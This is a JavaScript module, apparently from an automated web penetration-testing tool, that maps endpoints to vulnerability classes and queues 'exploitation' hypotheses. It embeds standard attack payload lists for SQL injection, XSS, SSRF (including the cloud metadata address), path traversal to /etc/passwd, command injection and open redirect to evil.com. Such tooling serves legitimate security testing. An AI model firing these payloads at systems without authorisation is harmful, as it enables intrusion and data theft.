/**
 * Vulnerability Mapper - Source-to-Sink Inference
 * 
 * Maps endpoints to vulnerability classes and creates hypothesis queues
 * for exploitation based on observed patterns.
 */

import { inferParameterType, generateSecurityAnnotations } from '../utils/inference.js';

/**
 * Vulnerability class definitions with source/sink patterns
 */
const VULNERABILITY_CLASSES = {
    SQLi: {
        name: 'SQL Injection',
        sourcePatterns: ['id', 'user_id', 'order', 'sort', 'filter', 'search', 'query', 'where'],
        sinkIndicators: ['database', 'query', 'select', 'order by'],
        httpMethods: ['GET', 'POST'],
        priority: 'critical'
    },
    XSS: {
        name: 'Cross-Site Scripting',
        sourcePatterns: ['name', 'title', 'content', 'message', 'comment', 'body', 'description', 'q'],
        sinkIndicators: ['html', 'render', 'display', 'output'],
        httpMethods: ['GET', 'POST'],
        priority: 'high'
    },
    SSRF: {
        name: 'Server-Side Request Forgery',
        sourcePatterns: ['url', 'uri', 'link', 'src', 'target', 'dest', 'webhook', 'callback', 'redirect'],
        sinkIndicators: ['fetch', 'request', 'http', 'download'],
        httpMethods: ['GET', 'POST'],
        priority: 'critical'
    },
    LFI: {
        name: 'Local File Inclusion',
        sourcePatterns: ['file', 'path', 'filename', 'template', 'page', 'include', 'doc', 'pdf'],
        sinkIndicators: ['read', 'include', 'require', 'file'],
        httpMethods: ['GET'],
        priority: 'critical'
    },
    IDOR: {
        name: 'Insecure Direct Object Reference',
        sourcePatterns: ['id', 'user_id', 'account_id', 'order_id', 'doc_id', 'file_id', 'record'],
        sinkIndicators: ['get', 'fetch', 'load', 'access'],
        httpMethods: ['GET', 'PUT', 'DELETE'],
        priority: 'high'
    },
    CommandInjection: {
        name: 'Command Injection',
        sourcePatterns: ['cmd', 'command', 'exec', 'run', 'ping', 'host', 'ip', 'domain', 'shell'],
        sinkIndicators: ['exec', 'system', 'shell', 'spawn'],
        httpMethods: ['GET', 'POST'],
        priority: 'critical'
    },
    AuthBypass: {
        name: 'Authentication Bypass',
        sourcePatterns: ['admin', 'debug', 'test', 'bypass', 'override', 'force'],
        sinkIndicators: ['auth', 'login', 'session', 'verify'],
        httpMethods: ['GET', 'POST'],
        priority: 'critical'
    },
    OpenRedirect: {
        name: 'Open Redirect',
        sourcePatterns: ['redirect', 'next', 'return', 'goto', 'url', 'continue', 'target'],
        sinkIndicators: ['redirect', 'location', 'navigate'],
        httpMethods: ['GET'],
        priority: 'medium'
    }
};

/**
 * Map endpoints to potential vulnerability classes
 * 
 * @param {Array} endpoints - Discovered endpoints
 * @returns {Object} - Vulnerability mapping
 */
export function mapEndpointsToVulnerabilities(endpoints) {
    const mapping = {
        critical: [],
        high: [],
        medium: [],
        low: [],
        stats: {
            total: endpoints.length,
            mapped: 0,
            unmapped: 0
        }
    };

    for (const endpoint of endpoints) {
        const vulns = identifyVulnerabilityClasses(endpoint);

        if (vulns.length > 0) {
            mapping.stats.mapped++;

            for (const vuln of vulns) {
                const entry = {
                    endpoint: endpoint.path,
                    method: endpoint.method || 'GET',
                    source: endpoint.source,
                    vulnerabilityClass: vuln.class,
                    vulnerabilityName: vuln.name,
                    matchedParams: vuln.matchedParams,
                    confidence: vuln.confidence,
                    exploitHints: vuln.exploitHints
                };

                mapping[vuln.priority].push(entry);
            }
        } else {
            mapping.stats.unmapped++;
        }
    }

    return mapping;
}

/**
 * Identify vulnerability classes for an endpoint
 */
function identifyVulnerabilityClasses(endpoint) {
    const vulns = [];
    const params = endpoint.params || [];

    for (const [vulnClass, config] of Object.entries(VULNERABILITY_CLASSES)) {
        const matchedParams = [];

        for (const param of params) {
            const paramLower = param.name?.toLowerCase() || '';

            for (const pattern of config.sourcePatterns) {
                if (paramLower.includes(pattern) || paramLower === pattern) {
                    matchedParams.push({
                        name: param.name,
                        matchedPattern: pattern,
                        location: param.location || 'query'
                    });
                    break;
                }
            }
        }

        if (matchedParams.length > 0) {
            // Calculate confidence based on matches
            const confidence = Math.min(0.3 + (matchedParams.length * 0.15), 0.9);

            vulns.push({
                class: vulnClass,
                name: config.name,
                priority: config.priority,
                matchedParams,
                confidence,
                exploitHints: generateExploitHints(vulnClass, matchedParams)
            });
        }
    }

    return vulns;
}

/**
 * Generate exploit hints for a vulnerability class
 */
function generateExploitHints(vulnClass, matchedParams) {
    const hints = [];
    const paramNames = matchedParams.map(p => p.name);

    switch (vulnClass) {
        case 'SQLi':
            hints.push(`Test ${paramNames.join(', ')} with: ' OR '1'='1`);
            hints.push(`Time-based: ' AND SLEEP(5)--`);
            hints.push(`Error-based: ' AND 1=CONVERT(int,@@version)--`);
            break;

        case 'XSS':
            hints.push(`Test ${paramNames.join(', ')} with: <script>alert(1)</script>`);
            hints.push(`Event handler: " onmouseover="alert(1)`);
            hints.push(`SVG: <svg/onload=alert(1)>`);
            break;

        case 'SSRF':
            hints.push(`Test ${paramNames.join(', ')} with: http://127.0.0.1:80`);
            hints.push(`Cloud metadata: http://169.254.169.254/latest/meta-data/`);
            hints.push(`Internal scan: http://localhost:22`);
            break;

        case 'LFI':
            hints.push(`Test ${paramNames.join(', ')} with: ../../../etc/passwd`);
            hints.push(`Null byte: ../../../etc/passwd%00`);
            hints.push(`Double encoding: ..%252f..%252f..%252fetc/passwd`);
            break;

        case 'IDOR':
            hints.push(`Increment/decrement ${paramNames.join(', ')} values`);
            hints.push(`Try accessing other users' resources`);
            hints.push(`Test with different HTTP methods`);
            break;

        case 'CommandInjection':
            hints.push(`Test ${paramNames.join(', ')} with: ; id`);
            hints.push(`Backticks: \`id\``);
            hints.push(`Pipe: | id`);
            break;

        case 'OpenRedirect':
            hints.push(`Test ${paramNames.join(', ')} with: //evil.com`);
            hints.push(`Protocol: javascript:alert(1)`);
            hints.push(`Encoded: %2f%2fevil.com`);
            break;
    }

    return hints;
}

/**
 * Generate hypothesis queue for exploitation
 * 
 * @param {Object} vulnMapping - Vulnerability mapping from mapEndpointsToVulnerabilities
 * @returns {Array} - Prioritized exploitation queue
 */
export function generateHypothesisQueue(vulnMapping) {
    const queue = [];

    // Add critical first, then high, medium, low
    for (const priority of ['critical', 'high', 'medium', 'low']) {
        for (const vuln of vulnMapping[priority]) {
            queue.push({
                id: `${vuln.vulnerabilityClass}-${queue.length + 1}`,
                priority,
                endpoint: vuln.endpoint,
                method: vuln.method,
                vulnerabilityClass: vuln.vulnerabilityClass,
                vulnerabilityName: vuln.vulnerabilityName,
                parameters: vuln.matchedParams,
                confidence: vuln.confidence,
                status: 'pending',
                exploitHints: vuln.exploitHints,
                testPayloads: generateTestPayloads(vuln.vulnerabilityClass)
            });
        }
    }

    return queue;
}

/**
 * Generate test payloads for a vulnerability class
 */
function generateTestPayloads(vulnClass) {
    const payloads = {
        SQLi: [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "1' AND '1'='1",
            "1; SELECT * FROM users--",
            "' UNION SELECT NULL--"
        ],
        XSS: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "'\"><script>alert(1)</script>",
            "<svg/onload=alert(1)>"
        ],
        SSRF: [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/",
            "http://[::1]",
            "file:///etc/passwd"
        ],
        LFI: [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd"
        ],
        IDOR: [
            "1", "2", "0", "-1", "999999"
        ],
        CommandInjection: [
            "; id",
            "| id",
            "& id",
            "`id`",
            "$(id)"
        ],
        OpenRedirect: [
            "//evil.com",
            "https://evil.com",
            "/\\evil.com",
            "//evil.com/%2f..",
            "javascript:alert(1)"
        ],
        AuthBypass: [
            "true", "1", "admin", "bypass", "debug"
        ]
    };

    return payloads[vulnClass] || [];
}

/**
 * Identify all input vectors in endpoints
 * 
 * @param {Array} endpoints - Discovered endpoints
 * @returns {Object} - Categorized input vectors
 */
export function identifyInputVectors(endpoints) {
    const vectors = {
        queryParams: [],
        pathParams: [],
        bodyParams: [],
        headers: [],
        cookies: [],
        files: []
    };

    for (const endpoint of endpoints) {
        for (const param of endpoint.params || []) {
            const inference = inferParameterType(param.name, param.value || '');

            const vector = {
                endpoint: endpoint.path,
                name: param.name,
                type: inference.type,
                format: inference.format,
                isSecurityRelevant: inference.isSecurityRelevant,
                candidateFor: inference.candidateFor
            };

            switch (param.location) {
                case 'query':
                    vectors.queryParams.push(vector);
                    break;
                case 'path':
                    vectors.pathParams.push(vector);
                    break;
                case 'body':
                    vectors.bodyParams.push(vector);
                    break;
                case 'header':
                    vectors.headers.push(vector);
                    break;
                case 'cookie':
                    vectors.cookies.push(vector);
                    break;
                case 'file':
                    vectors.files.push(vector);
                    break;
                default:
                    vectors.queryParams.push(vector);
            }
        }
    }

    return vectors;
}

export { VULNERABILITY_CLASSES };
